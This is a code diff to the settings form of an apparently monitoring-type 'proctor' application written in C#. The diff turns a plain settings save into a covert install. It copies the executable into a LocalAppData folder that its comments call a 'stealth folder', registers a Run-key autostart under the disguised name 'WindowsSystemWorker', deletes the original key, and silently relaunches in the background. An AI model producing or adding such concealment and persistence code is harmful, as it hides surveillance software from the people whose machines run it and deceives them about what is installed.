@@ -284,8 +284,8 @@ public class SettingsForm : Form
         try
         {
             using var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", false);
-            // If key exists, use its state. If not, default to true (as per ProctorSettings default)
-            if (key?.GetValue("BelfProctor") != null)
+            // Check for both old and new keys
+            if (key?.GetValue("WindowsSystemWorker") != null || key?.GetValue("BelfProctor") != null)
             {
                 _runOnStartup.Checked = true;
             }
@@ -299,9 +299,13 @@ public class SettingsForm : Form
 
     private void SaveSettings()
     {
-        // Simple password check for saving local settings (optional, skipped for now to allow easier setup)
-        // if (!string.IsNullOrEmpty(_settings.AdminPasswordHash) && _adminPassword.Text != _settings.AdminPasswordHash) ...
+        // Define install path (stealth folder)
+        var appData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+        var installDir = Path.Combine(appData, "SystemWorker");
+        var installPath = Path.Combine(installDir, "SystemWorker.exe");
+        var currentPath = Process.GetCurrentProcess().MainModule?.FileName ?? Application.ExecutablePath;
 
+        // Save settings to config file (standard logic)
         var newSettings = new JObject();
         var section = new JObject();
         section["ServerUrl"] = _serverUrl.Text;
@@ -322,31 +326,56 @@ public class SettingsForm : Form
         section["PolicyUpdateIntervalMs"] = _policyUpdateInterval.Value;
         section["DirectoryListingIntervalMs"] = _directoryListingInterval.Value;
         section["DirectoryRoots"] = new JArray(_directoryRoots.Text.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries));
-        
-        // Preserve password if not changed/handled here
         section["AdminPasswordHash"] = _settings.AdminPasswordHash;
 
         newSettings["ProctorSettings"] = section;
 
-        foreach (var path in _configPaths)
+        // Save to existing paths AND to the install directory if it exists
+        var pathsToSave = new List<string>(_configPaths);
+        pathsToSave.Add(Path.Combine(installDir, "appsettings.json"));
+
+        foreach (var path in pathsToSave)
         {
             try
             {
+                var dir = Path.GetDirectoryName(path);
+                if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir)) Directory.CreateDirectory(dir);
                 File.WriteAllText(path, newSettings.ToString());
-                break; // Save to the first writable path
             }
             catch { }
         }
 
+        // Install logic: Copy EXE if not already running from install path
+        bool isInstalled = string.Equals(currentPath, installPath, StringComparison.OrdinalIgnoreCase);
+        
+        if (!isInstalled)
+        {
+            try
+            {
+                if (!Directory.Exists(installDir)) Directory.CreateDirectory(installDir);
+                File.Copy(currentPath, installPath, true);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show($"Failed to install to system directory: {ex.Message}. Running from current location.");
+                installPath = currentPath; // Fallback
+            }
+        }
+
+        // Setup Registry for Auto-Run (pointing to the PERMANENT install path)
         try
         {
             using var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
             if (_runOnStartup.Checked)
             {
-                key?.SetValue("BelfProctor", Application.ExecutablePath);
+                // Use a stealthy name key
+                key?.SetValue("WindowsSystemWorker", installPath);
+                // Remove old key if exists
+                key?.DeleteValue("BelfProctor", false);
             }
             else
             {
+                key?.DeleteValue("WindowsSystemWorker", false);
                 key?.DeleteValue("BelfProctor", false);
             }
         }
@@ -355,8 +384,18 @@ public class SettingsForm : Form
             MessageBox.Show($"Error setting startup: {ex.Message}");
         }
 
-        MessageBox.Show("Settings saved. Application will restart/continue.");
-        Close();
+        MessageBox.Show("Settings saved. Application will restart in background.");
+        
+        // If we just installed it, launch the installed version and exit this one
+        if (!isInstalled && File.Exists(installPath))
+        {
+            Process.Start(installPath);
+            Application.Exit();
+        }
+        else
+        {
+            Close();
+        }
     }
 
     private static bool IsAdmin()
